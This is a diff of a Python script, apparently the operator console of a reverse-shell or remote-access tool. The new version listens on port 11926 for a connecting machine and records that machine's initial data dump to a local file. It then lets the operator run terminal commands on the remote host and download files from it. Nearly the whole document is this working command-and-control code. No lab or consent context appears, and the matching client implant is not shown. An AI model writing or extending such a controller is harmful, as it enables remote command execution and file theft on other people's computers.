@@ -1,33 +1,23 @@
 from socket import *
 import os
 import sys
-import time
 
 
 
 def connection():
 
-    while True:
+    serverPort = 11926
+    serverSocket = socket(AF_INET,SOCK_STREAM)
 
-        ip = input("Inserisci indirizzo IP: ")
-   
-        try:
+    serverSocket.bind( ('',serverPort) )
+    serverSocket.listen(1)
 
-            serverName = ip #e' un nome simbolico, che il DNS (un sistema interno) che lo traduce in IP
-            serverPort = 11926
-            serverSocket = socket(AF_INET, SOCK_STREAM)
-            serverSocket.connect((serverName,serverPort))
+    print ("The Server is ready to receive")
 
-        except ConnectionRefusedError:
+    serverSocket, addr = serverSocket.accept()
+    print("Accepted a new client", addr)
 
-            print("Errore di connessione\n")
-            time.sleep(2)
-
-        else:
-
-            print("Connessione effettuata correttamente")
-            return serverSocket
-
+    return serverSocket
 
 
 def printOptions():
@@ -37,22 +27,20 @@ def printOptions():
     print("2) Esci\n")
 
 
-
 def setup(serverSocket):
 
     file = open(os.path.join(sys.path[0], 'dati.txt'), mode='a')
     
-    result = (str)(serverSocket.recv(1048576).decode())
+    result = (str)(serverSocket.recv(1048576).decode(encoding="latin-1"))
 
     while not(result.endswith("uscita")):
         file.write("\n******************************************\n\n"+result)
-        result = (str)(serverSocket.recv(1048576).decode())
+        result = (str)(serverSocket.recv(1048576).decode(encoding="latin-1"))
     
     file.write("\n******************************************\n\n"+result.rstrip('uscita'))
             
     file.close()
     
-
     
 def download(fileName, connectionSocket):
 
@@ -64,24 +52,23 @@ def download(fileName, connectionSocket):
             file.write(data)
             data = connectionSocket.recv(1024)
 
+        file.write(data)
         file.close()
 
-    except:
-        print("Errore durante il download del file\n")
+    except Exception as e:
+        print("Error during file download\n")
         file.close()
 
 
 def shell(serverSocket):
     
 
-    print("Inserisci i comandi che vuoi eseguire da terminale\n(esc per uscire , print per salvare l'ultimo output, erase per eliminare i dati salvati)\n ")
+    print("Inserisci i comandi che vuoi eseguire da terminale\n(esc per uscire , print per salvare l'ultimo output, erase per eliminare i dati salvati, download [nomeFile.estensione] per salvare una copia locale di nomeFile.estensione)\n ")
     result = ''
         
-            
     while True:
 
         file = open(os.path.join(sys.path[0], 'dati.txt'), mode='a' )
-
 
         try:
 
@@ -91,10 +78,29 @@ def shell(serverSocket):
                 file.close()
                 break
 
+            if comando.startswith("download"):
+                serverSocket.send(comando.encode(encoding="latin-1"))
+                download(comando[9:], serverSocket)
+                continue
+
+            
+            if comando == "print":
+                file.write("\n******************************************\n\n"+result)
+                continue
+
+            if comando == "erase":
+                file.truncate(0)
+                continue
+
+            if comando == "" or comando.isspace():
+                print("\nInvalid commands\n")
+                continue
+
+            
             try:
 
                 if comando == "recv":
-                    result = serverSocket.recv(1048576).decode()
+                    result = serverSocket.recv(1048576).decode(encoding="latin-1")
                     print(result)
                     continue            
 
@@ -103,27 +109,10 @@ def shell(serverSocket):
                 continue
 
 
-            if comando.startswith("download"):
-                serverSocket.send(comando.encode())
-                download(comando[9:], serverSocket)
-                continue
-
-            
-            if comando == "print": #scrive sul file l'ultimo output (lo crea se non esiste)
-                file.write("\n******************************************\n\n"+result)
-                continue
-
-            if comando == "erase": #cancella il contenuto del file (lo crea se non esiste)
-                file.truncate(0)
-                continue
-
-            if comando == "" or comando.isspace():
-                print("\ncomando non valido\n")
-                continue
-            
             else:
-                serverSocket.send(comando.encode())
-                result = serverSocket.recv(1048576).decode()
+                serverSocket.send(comando.encode(encoding="latin-1"))
+                result = serverSocket.recv(1048576).decode(encoding="latin-1")
+
                 print("\nOUTPUT:\n")
                 print(result)
         
@@ -131,8 +120,6 @@ def shell(serverSocket):
 
         except KeyboardInterrupt:
             continue
-
-
 
 
 def main():
@@ -149,18 +136,17 @@ def main():
             setup(serverSocket)
             shell(serverSocket)
             
-            serverSocket.send("esc".encode())
+            serverSocket.send("esc".encode(encoding="latin-1"))
             serverSocket.close()
 
         elif scelta == "2":
             break
         
         else:
-            print("Inserisci un numero valido")
+            print("Choose any valid number\n")
 
 
     print("Connection closed\n")
-
 
 
 if __name__== "__main__" :
